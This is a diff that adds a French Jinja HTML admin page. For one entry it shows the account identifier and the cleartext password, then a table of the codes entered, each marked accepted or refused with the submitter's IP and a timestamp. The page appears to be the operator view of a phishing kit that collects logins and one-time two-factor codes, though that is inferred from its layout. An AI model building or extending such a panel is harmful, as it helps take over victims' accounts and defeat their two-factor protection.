@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Codes — {{ entree['identifiant'] }}</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body class="page-admin">
+  <main class="admin-large">
+    <header class="admin-tete">
+      <h1>Codes saisis <span class="badge">{{ tentatives|length }}</span></h1>
+      <nav><a class="btn-mini" href="/admin/">Retour</a></nav>
+    </header>
+
+    <p class="rappel">{{ entree['identifiant'] }} · mot de passe <span class="mono">{{ entree['mot_de_passe'] }}</span></p>
+
+    <div class="tableau-scroll">
+      <table>
+        <thead><tr><th>#</th><th>Code</th><th>Verdict</th><th>IP</th><th>Date</th></tr></thead>
+        <tbody>
+          {% for t in tentatives %}
+          <tr>
+            <td class="num">{{ loop.index }}</td>
+            <td class="mono">{{ t['code'] or '(vide)' }}</td>
+            <td class="{{ 'ok-txt' if t['valide'] else 'non-txt' }}">{{ 'accepté' if t['valide'] else 'refusé' }}</td>
+            <td class="num">{{ t['ip'] }}</td>
+            <td class="num">{{ t['cree_le'] }}</td>
+          </tr>
+          {% else %}
+          <tr><td colspan="5" class="vide">Aucun code saisi.</td></tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
+  </main>
+</body>
+</html>
